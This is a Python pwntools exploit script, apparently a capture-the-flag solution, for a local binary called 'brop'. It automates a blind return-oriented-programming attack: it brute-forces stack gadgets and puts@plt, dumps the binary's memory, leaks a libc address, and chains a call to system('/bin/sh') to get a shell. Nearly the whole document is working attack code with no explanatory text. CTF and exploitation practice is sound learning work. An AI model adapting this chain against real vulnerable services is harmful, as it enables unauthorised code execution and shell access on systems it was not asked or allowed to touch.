from pwn import *
from struct import pack
from ctypes import *
import base64
#from LibcSearcher import *

def debug(c = 0):
    if(c):
        gdb.attach(p, c)
    else:
        gdb.attach(p)
        pause()
def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))
#-----------------------------------------------------------------------------------------
s = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data   :p.sendline(data)
sla = lambda text,data  :p.sendlineafter(text, data)
r   = lambda num=4096   :p.recv(num)
rl  = lambda text   :p.recvuntil(text)
pr = lambda num=4096 :print(p.recv(num))
inter   = lambda        :p.interactive()
l32 = lambda    :u32(p.recvuntil(b'\xf7')[-4:].ljust(4,b'\x00'))
l64 = lambda    :u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
uu32    = lambda    :u32(p.recv(4).ljust(4,b'\x00'))
uu64    = lambda    :u64(p.recv(6).ljust(8,b'\x00'))
int16   = lambda data   :int(data,16)
lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))
#-----------------------------------------------------------------------------------------

#context(os='linux', arch='amd64', log_level='debug')
#p = process('./brop')
elf = ELF('./brop')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def find_stop_gadget(buf_size, start_addr = 0x400000, end_addr = 0x401000):
    stop_gadget = start_addr
    while True:
        time.sleep(0.1)
        stop_gadget += 1
        if(stop_gadget > end_addr):
        	log.info('not found!')
        	return 0
        payload = b'a' * buf_size + p64(stop_gadget)
        try: 
            p = process('./brop')
            p.sendafter(b'>>\n', payload)
            p.recv()
            p.close()
            return stop_gadget
        except EOFError as e:
            p.close()
            log.info("not 0x%x, try harder!", stop_gadget)
def get_stop_gadget():
	for i in range(0x8, 0x100, 8):
		rl = find_stop_gadget(i, 0x400560)
		if(rl):
			log.info("find one stop gadget: 0x%x", rl)
			break

stop_gadget = 0x400570

def find_pop6_ret(buf_size, stop_gadget, start_addr = 0x400000, end_addr = 0x401000):
    pop6_ret = start_addr
    stop_gadget = stop_gadget

    while True:
        time.sleep(0.1)
        pop6_ret += 1
        if(pop6_ret > end_addr):
        	log.info('not found')
        	return 0
        payload = b'a' * buf_size + p64(pop6_ret) + p64(0) * 6 + p64(stop_gadget) 
        try:
            p = process('./brop')
            p.sendafter('>>\n', payload)
            resp = p.recv(timeout=0.5)
            p.close()
            log.info("find one stop_gadget: 0x%x", pop6_ret)

            if b'>>' in resp:
                try:
                    payload = b'a' * buf_size + p64(pop6_ret)
                    p = process('./brop')
                    p.sendafter('>>\n', payload)
                    p.recv()
                    p.close()
                except EOFError as e:
                    p.close()
                    log.info("find useful gadget: 0x%x", pop6_ret)
                    return pop6_ret
        except EOFError as e:
            p.close()
            log.info("not 0x%x,try harder", pop6_ret)

pop6_ret = 0x40075a
rdi = pop6_ret + 9

def find_puts_plt(buf_size, stop_gadget, start_addr = 0x400000, end_addr = 0x401000):
    elf_magic_addr = 0x400000
    puts_plt = start_addr

    while True:
        puts_plt += 1
        payload = b'a' * buf_size + p64(rdi) + p64(elf_magic_addr) + p64(puts_plt) + p64(stop_gadget)

        try:
            p = process('./brop')
            p.sendafter(b'>>\n', payload)
            resp1 = p.recvline(timeout=0.5)
            resp2 = p.recvline(timeout=0.5)

            if b'\x7fELF' in resp1 and b'>>\n' in resp2:
                p.close()
                log.info("puts_plt: 0x%x", puts_plt)
                return puts_plt
            p.close()
            log.info("find one stop gadget: 0x%x", puts_plt)

        except EOFError as e:
            p.close()
            log.info("not 0x%x, try harder", puts_plt)

puts_plt = 0x400515

def dump_memory(buf_size, stop_gadget, puts_plt, start_addr=0x400000, end_addr = 0x401000):
    result = b''
    while start_addr < end_addr:
        sleep(0.1)
        payload = b'a' * buf_size + p64(rdi) + p64(start_addr) + p64(puts_plt)
        try:
            p = process('./brop')
            p.sendafter(b'>>\n', payload)
            resp1 = p.recv(timeout=0.5)
            if resp1 == b'\n':
                resp = b'\x00'
            elif resp1[-1:] == b'\n':
                log.info("[tail]leaking: 0x%x --> %s" % (start_addr, (resp or b'').hex()))
                resp = resp1[:-1] + b'\x00'
            else:
                resp = resp1
            
            if resp != resp1:
                log.info("[change]resp1: 0x%x: %s --> resp1: 0x%x: %s" % (start_addr, (resp1 or b'').hex(), start_addr, (resp or b'').hex()))

            log.info("leaking: 0x%x --> %s" % (start_addr, (resp or b'').hex()))
            result += resp
            start_addr += len(resp)
            p.close()
        except Exception as e:
            print(e)
            log.info("connect error")
    with open('pwn','wb') as f:
   		f.write(result)

p = process('./brop')
sa(b'>>\n', b'a'*0x18 + p64(rdi) + p64(0x601018) + p64(puts_plt) + p64(stop_gadget))
libc_base = l64() - libc.sym['puts']

lg('libc_base', libc_base)

ret = pop6_ret + 0xa
system, binsh = get_sb()

sa(b'>>\n', b'a'*0x18 + p64(ret) + p64(rdi) + p64(binsh) + p64(system))
inter()

